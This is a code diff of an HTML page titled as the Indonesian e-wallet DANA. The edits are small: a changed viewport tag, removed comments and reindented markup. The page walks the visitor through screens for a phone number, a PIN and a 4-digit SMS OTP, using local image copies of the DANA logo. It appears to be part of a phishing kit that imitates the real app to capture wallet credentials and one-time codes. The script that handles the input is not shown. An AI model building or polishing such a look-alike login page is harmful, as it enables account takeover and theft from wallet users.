@@ -2,7 +2,7 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, virtual-keyboard=interactive-widget">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, interactive-widget=resizes-content">
   <title>DANA - Dompet Digital Indonesia</title>
   <link rel="stylesheet" href="css/style.css">
 </head>
@@ -10,7 +10,6 @@
 
   <div class="app-container">
     
-    <!-- 1. SPLASH SCREEN -->
     <div id="splashScreen" class="screen splash-screen">
       <div class="splash-content">
         <img class="logo-dana" src="foto/logo_text.png">
@@ -22,7 +21,6 @@
       </div>
     </div>
 
-    <!-- 2. LOADING SCREEN WITH LOGO INSIDE SPINNER -->
     <div id="loadingScreen" class="loading-overlay hidden">
       <div class="spinner-box">
       <img src="foto/load_spin.png" alt="Ring Photo" class="spinner-photo-ring">
@@ -30,9 +28,7 @@
       </div>
     </div>
 
-    <!-- 3. HALAMAN NOMOR TELEPON -->
     <div id="pagePhone" class="screen page-content hidden">
-      <!-- Logo Tengah Atas -->
       <div class="top-logo-container">
         <img class="logo-dana small" src="foto/dana_logo.png">
       </div>
@@ -62,9 +58,7 @@
       </div>
     </div>
 
-
     <div id="pagePin" class="screen page-content hidden">
-
       <div class="top-logo-container">
         <img class="logo-dana small" src="foto/dana_logo.png">
       </div>
@@ -84,27 +78,25 @@
       </div>
     </div>
 
-
-<div id="otpBottomSheet" class="bottom-sheet hidden">
-  <div class="sheet-backdrop"></div>
-  <div class="sheet-content">
-    <div class="sheet-handle"></div>
-    <div class="sheet-body text-center">
-      <h3 class="sheet-title">Masukkan Kode OTP</h3>
-      <p class="sheet-subtitle">Kami telah mengirimkan kode verifikasi 4-digit melalui SMS ke nomor HP kamu.</p>
-      
-      <div class="otp-container">
-        <input type="text" id="otp1" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
-        <input type="text" id="otp2" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
-        <input type="text" id="otp3" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
-        <input type="text" id="otp4" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+    <div id="otpBottomSheet" class="bottom-sheet hidden">
+      <div class="sheet-backdrop"></div>
+      <div class="sheet-content">
+        <div class="sheet-handle"></div>
+        <div class="sheet-body text-center">
+          <h3 class="sheet-title">Masukkan Kode OTP</h3>
+          <p class="sheet-subtitle">Kami telah mengirimkan kode verifikasi 4-digit melalui SMS ke nomor HP kamu.</p>
+          
+          <div class="otp-container">
+            <input type="text" id="otp1" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+            <input type="text" id="otp2" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+            <input type="text" id="otp3" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+            <input type="text" id="otp4" maxlength="1" class="otp-field" pattern="\d*" inputmode="numeric" autocomplete="off">
+          </div>
+          
+          <div class="countdown-text">Kirim ulang dalam <span id="timer">60</span> detik</div>
+        </div>
       </div>
-      
-      <div class="countdown-text">Kirim ulang dalam <span id="timer">60</span> detik</div>
     </div>
-  </div>
-</div>
-
     
   </div>
   <script src="js/script.js"></script>
